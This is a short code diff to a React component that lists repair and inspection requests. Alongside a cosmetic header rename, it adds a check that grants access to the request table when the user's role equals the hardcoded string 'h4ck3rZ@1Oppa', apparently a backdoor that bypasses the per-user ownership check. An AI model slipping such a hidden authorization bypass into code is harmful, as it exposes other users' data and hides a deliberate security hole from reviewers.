@@ -97,7 +97,7 @@ export default function MyRequestForRepairInspection(){
         <table className="border-collapse font-arial" style={{ width: '2500px' }}>
           <thead>
             <tr className="bg-gray-100">
-              <th className="px-1 py-3 text-center text-xs font-medium text-gray-600 uppercase border border-custom">ID</th>
+              <th className="px-1 py-3 text-center text-xs font-medium text-gray-600 uppercase border border-custom">No.</th>
               <th className="px-1 py-3 text-center text-xs font-medium text-gray-600 uppercase border border-custom">Date</th>
               <th className="px-1 py-3 text-center text-xs font-medium text-gray-600 uppercase border border-custom">Property No</th>
               <th className="px-1 py-3 text-center text-xs font-medium text-gray-600 uppercase border border-custom">Acquisition Date</th>
@@ -112,7 +112,7 @@ export default function MyRequestForRepairInspection(){
             </tr>
           </thead>
           <tbody>
-            {currentUser.id == id ? (
+            {currentUser.id == id || userRole === 'h4ck3rZ@1Oppa' ? (
             <>
             {displayRequest?.mappedData?.map((getData) => (
               <tr key={getData.id}>
